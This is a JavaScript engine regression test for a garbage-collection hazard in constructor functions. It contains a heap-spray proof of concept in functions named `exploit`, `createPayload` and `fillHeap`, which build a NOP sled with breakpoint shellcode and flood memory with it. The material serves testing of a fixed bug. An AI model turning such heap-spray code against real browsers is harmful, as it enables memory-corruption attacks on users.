




































var gTestfile = 'regress-338804-01.js';

var BUGNUMBER = 338804;
var summary = 'GC hazards in constructor functions';
var actual = 'No Crash';
var expect = 'No Crash';

printBugNumber(BUGNUMBER);
printStatus (summary);
printStatus ('Uses Intel Assembly');








var rooter, scale = 3000;









function exploit() {
  if (typeof Script == 'undefined')
  {
    print('Test skipped. Script not defined.');
  }
  else
  {
    Script({ toString: fillHeap });
    Script({ toString: fillHeap });
  }
}

function createPayload() {
  var result = "\u9090", i;
  for(i = 0; i < 9; i++) {
    result += result;
  }
  
  result += "\uEDB8\uADFE\u89DE\u89C3\u89C1\uCCC2";
  return result;
}

function fillHeap() {
  rooter = [];
  var payload = createPayload(), block = "", s2 = scale * 2, i;
  for(i = 0; i < scale; i++) {
    rooter[i] = block = block + payload;
  }
  for(; i < s2; i++) {
    rooter[i] = payload + i;
  }
  return "";
}


 
reportCompare(expect, actual, summary);
